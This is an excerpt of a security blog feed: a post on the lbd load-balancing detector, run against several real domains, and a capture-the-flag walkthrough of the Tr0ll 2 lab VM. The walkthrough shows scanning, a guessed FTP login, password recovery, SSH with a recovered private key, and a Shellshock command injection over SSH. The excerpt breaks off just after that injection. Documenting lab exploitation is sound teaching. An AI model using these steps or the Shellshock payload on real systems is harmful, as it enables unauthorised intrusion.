<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Nothing so needs reforming as other \
</span><span class='line'>| people's habits.                    |
</span><span class='line'>|                                     |
</span><span class='line'>\ -- Mark Twain                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[lbd - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools/"/>
    <updated>2017-06-07T05:46:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Load balancing is the practice of distributing traffic across multiple servers, in order to increase performance and reliability. With multiple servers offering the same resources, single points of failure are eliminated, and availability is increased. Load balancers may be set up in a way that users from certain geographic locations are sent to specific servers, in order to increase the speed of access.</p>

<p>Load balancing introduces some issue in penetration tests, because it interferes with the accuracy of the testing. This is why it&rsquo;s important to establish whether load balancers are in place, and if there are, taking that into account when performing the tests and writing the reports.</p>

<!-- more -->


<p>lbd (load balancing detector) is a Kali tool that is useful for determining the presence of load balancing.</p>

<p>Author: Stefan Behte</p>

<h2>lbd description</h2>

<blockquote><p>lbd (load balancing detector) detects if a given domain uses DNS and/or HTTP Load-Balancing (via Server: and Date:
header and diffs between server answers).</p></blockquote>

<h3>DNS load balancing</h3>

<p>In DNS load balancing, a system has a list of IPs that can respond to requests. When you request a resource, you hit on one of these IPs, and you need to test further to identify the exact target. If your target is <em>example.com</em>, and 3 IPs are serving that, when you find a vulnerability, you still have to determine which of these addresses is the vulnerable one (or if all are).</p>

<h3>HTTP load balancing</h3>

<p>One of the ways HTTP load balancing can be achieved is through cookies. This comes in handy in online stores and other such web applications that need to identify a client and send it to the same specific resource</p>

<h2>lbd options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>usage: /usr/bin/lbd domain [port] {https}</span></code></pre></td></tr></table></div></figure>


<h2>lbd usage</h2>

<p>Let&rsquo;s now check a bunch of domains and see what load balancers we can find, if at all</p>

<ul>
<li>DNS and HTTP load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd hackerone.com
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: FOUND
</span><span class='line'>hackerone.com has address 104.16.100.52
</span><span class='line'>hackerone.com has address 104.16.99.52
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> cloudflare-nginx
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: FOUND
</span><span class='line'>&lt; CF-RAY: 36b32c07c6bf2950-OTP
</span><span class='line'>&gt; CF-RAY: 36b32c0835d7292c-OTP
</span><span class='line'>
</span><span class='line'>hackerone.com does Load-balancing. Found via Methods: DNS HTTP[Diff]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>HTTP load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd cisco.com
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: NOT FOUND
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> Apache
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:13:47, 11:13:47, 11:13:48, 11:13:49, 11:13:50, 11:13:51, 11:13:51, 11:13:52, 11:13:53, 11:13:54, 11:13:54, 11:13:55, 11:13:56, 11:13:57, 11:13:57, 11:13:58, 11:13:59, 11:14:00, 11:14:01, 11:14:01, 11:14:02, 11:14:03, 11:14:04, 11:14:04, 11:14:05, 11:14:06, 11:14:07, 11:14:07, 11:14:08, 11:14:09, 11:14:10, 11:14:11, 11:14:11, 11:14:12, 11:14:13, 11:14:14, 11:14:14, 11:14:15, 11:14:16, 11:14:17, 11:14:17, 11:14:18, 11:14:19, 11:14:20, 11:14:21, 11:14:21, 11:14:22, 11:14:23, 11:14:24, 11:14:24, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: FOUND
</span><span class='line'>&gt; Cache-Control: max-age=0
</span><span class='line'>&gt; Expires: Wed, 07 Jun 2017 11:14:27 GMT
</span><span class='line'>
</span><span class='line'>cisco.com does Load-balancing. Found via Methods: HTTP[Diff]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>no load balancing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lbd nmap.org
</span><span class='line'>
</span><span class='line'>lbd - load balancing detector 0.4 - Checks if a given domain uses load-balancing.
</span><span class='line'>                                    Written by Stefan Behte (http://ge.mine.nu)
</span><span class='line'>                                    Proof-of-concept! Might give false positives.
</span><span class='line'>
</span><span class='line'>Checking for DNS-Loadbalancing: NOT FOUND
</span><span class='line'>Checking for HTTP-Loadbalancing [Server]: 
</span><span class='line'> Apache/2.4.6 (CentOS)
</span><span class='line'> NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Date]: 11:17:00, 11:17:00, 11:17:01, 11:17:01, 11:17:02, 11:17:02, 11:17:03, 11:17:03, 11:17:03, 11:17:04, 11:17:04, 11:17:05, 11:17:05, 11:17:06, 11:17:06, 11:17:07, 11:17:07, 11:17:07, 11:17:08, 11:17:08, 11:17:09, 11:17:09, 11:17:10, 11:17:10, 11:17:10, 11:17:11, 11:17:11, 11:17:12, 11:17:12, 11:17:13, 11:17:13, 11:17:14, 11:17:14, 11:17:14, 11:17:15, 11:17:15, 11:17:16, 11:17:16, 11:17:17, 11:17:17, 11:17:17, 11:17:18, 11:17:18, 11:17:19, 11:17:19, 11:17:20, 11:17:20, 11:17:20, 11:17:21, 11:17:21, NOT FOUND
</span><span class='line'>
</span><span class='line'>Checking for HTTP-Loadbalancing [Diff]: NOT FOUND
</span><span class='line'>
</span><span class='line'>nmap.org does NOT use Load-balancing.</span></code></pre></td></tr></table></div></figure>


<h3>Key takeaways</h3>

<ul>
<li>when testing load balanced systems, you can try accessing them by IP instead of name (be advised that firewalls might pick up on this as suspicious activity)</li>
</ul>


<p>To learn more about load balancing and pentesting, check out this <a href="https://www.sans.org/reading-room/whitepapers/testing/identifying-load-balancers-penetration-testing-33313">SANS paper</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ Q: What is printed on the bottom of \
</span><span class='line'>| beer bottles in Minnesota? A: Open  |
</span><span class='line'>\ other end.                          /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
    <updated>2017-06-06T08:58:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>

<!-- more -->


<p>First, a bit of enumeration:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Currently scanning: Finished!   |   Screen View: Unique Hosts                 
</span><span class='line'>                                                                               
</span><span class='line'> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
</span><span class='line'> _____________________________________________________________________________
</span><span class='line'>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
</span><span class='line'> -----------------------------------------------------------------------------
</span><span class='line'> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor              
</span><span class='line'> 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor   </span></code></pre></td></tr></table></div></figure>


<p>The IP we want is 192.168.217.129.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- -sV -T4 192.168.217.129
</span><span class='line'>
</span><span class='line'>Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-30 10:27 EDT
</span><span class='line'>Nmap scan report for 192.168.217.129
</span><span class='line'>Host is up (0.000088s latency).
</span><span class='line'>Not shown: 65532 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>21/tcp open  ftp     vsftpd 2.0.8 or later
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:CB:3D:2E (VMware)
</span><span class='line'>Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre></td></tr></table></div></figure>


<p>You know the drill! Something awaits us on that web server!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll2/troll.png" title="troll" alt="troll"></p>

<p>And a comment in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="c">&lt;!--Nothing here, Try Harder!&gt;</span>
</span><span class='line'><span class="c">&lt;!--Author: Tr0ll&gt;</span>
</span><span class='line'><span class="c">&lt;!--Editor: VIM&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>User-agent:*
</span><span class='line'>Disallow:
</span><span class='line'>/noob
</span><span class='line'>/nope
</span><span class='line'>/try_harder
</span><span class='line'>/keep_trying
</span><span class='line'>/isnt_this_annoying
</span><span class='line'>/nothing_here
</span><span class='line'>/404
</span><span class='line'>/LOL_at_the_last_one
</span><span class='line'>/trolling_is_fun
</span><span class='line'>/zomg_is_this_it
</span><span class='line'>/you_found_me
</span><span class='line'>/I_know_this_sucks
</span><span class='line'>/You_could_give_up
</span><span class='line'>/dont_bother
</span><span class='line'>/will_it_ever_end
</span><span class='line'>/I_hope_you_scripted_this
</span><span class='line'>/ok_this_is_it
</span><span class='line'>/stop_whining
</span><span class='line'>/why_are_you_still_looking
</span><span class='line'>/just_quit
</span><span class='line'>/seriously_stop
</span></code></pre></td></tr></table></div></figure>


<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/tr0ll2/noob.png" title="noob" alt="noob"></p>

<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ftp 192.168.217.129
</span><span class='line'>Connected to 192.168.217.129.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay for a while...
</span><span class='line'>Name (192.168.217.129:root): Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; dir
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; get lmao.zip
</span><span class='line'>local: lmao.zip remote: lmao.zip
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs (8.4682 MB/s)
</span></code></pre></td></tr></table></div></figure>


<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>

<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>ls -l
</span><span class='line'>total 68
</span><span class='line'>-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
</span></code></pre></td></tr></table></div></figure>


<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>Look Deep within y0ur_self for the answer
</span></code></pre></td></tr></table></div></figure>


<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -l answer.txt
</span><span class='line'>99157 answer.txt
</span></code></pre></td></tr></table></div></figure>


<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>grep -r &quot;_&quot; decoded.txt
</span><span class='line'>noooob_lol
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>wc -L decoded.txt
</span><span class='line'>30 decoded.txt
</span></code></pre></td></tr></table></div></figure>


<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">argparse</span>
</span><span class='line'>
</span><span class='line'><span class="n">desc</span> <span class="o">=</span> <span class="s">&quot;Find and print lines from a file that are a certain length&quot;</span>
</span><span class='line'><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="n">desc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># length argument</span>
</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span><span class='line'>    <span class="s">&#39;-l&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Length value&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;length&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">int</span><span class="p">,</span>
</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># file add_argument</span>
</span><span class='line'><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
</span><span class='line'>    <span class="s">&#39;-f&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">help</span> <span class="o">=</span> <span class="s">&#39;Filename&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="n">dest</span> <span class="o">=</span> <span class="s">&#39;filename&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="nb">type</span> <span class="o">=</span> <span class="nb">str</span><span class="p">,</span>
</span><span class='line'>    <span class="n">required</span><span class="o">=</span><span class="bp">True</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">filename</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
</span><span class='line'>      <span class="c"># strip the newline character for accurate counting</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">))</span> <span class="o">==</span> <span class="n">args</span><span class="o">.</span><span class="n">length</span><span class="p">:</span>
</span><span class='line'>          <span class="k">print</span> <span class="n">line</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ran it and BOOM:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">line_length</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">l</span> <span class="mi">30</span> <span class="o">-</span><span class="n">f</span> <span class="n">decoded</span><span class="o">.</span><span class="n">txt</span>
</span><span class='line'><span class="n">ItCantReallyBeThisEasyRightLOL</span>
</span></code></pre></td></tr></table></div></figure>


<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">unzip</span> <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
</span><span class='line'><span class="n">Archive</span><span class="p">:</span>  <span class="n">lmao</span><span class="o">.</span><span class="n">zip</span>
</span><span class='line'><span class="p">[</span><span class="n">lmao</span><span class="o">.</span><span class="n">zip</span><span class="p">]</span> <span class="n">noob</span> <span class="n">password</span><span class="p">:</span>
</span><span class='line'>  <span class="n">inflating</span><span class="p">:</span> <span class="n">noob</span>
</span></code></pre></td></tr></table></div></figure>


<p>It looks like it&rsquo;s a private key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="nb">file</span> <span class="n">noob</span>
</span><span class='line'><span class="n">noob</span><span class="p">:</span> <span class="n">PEM</span> <span class="n">RSA</span> <span class="n">private</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>


<p>I tried SSH&#8217;ing as noob this time:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span>
</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>

<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">noob</span> <span class="n">noob</span><span class="nd">@192.168.217.129</span> <span class="o">-</span><span class="n">t</span> <span class="s">&quot;() { :; }; pwd&quot;</span>
</span><span class='line'><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">noob</span>
</span><span class='line'><span class="n">TRY</span> <span class="n">HARDER</span> <span class="n">LOL</span><span class="err">!</span>
</span><span class='line'><span class="n">Connection</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">217.129</span> <span class="n">closed</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


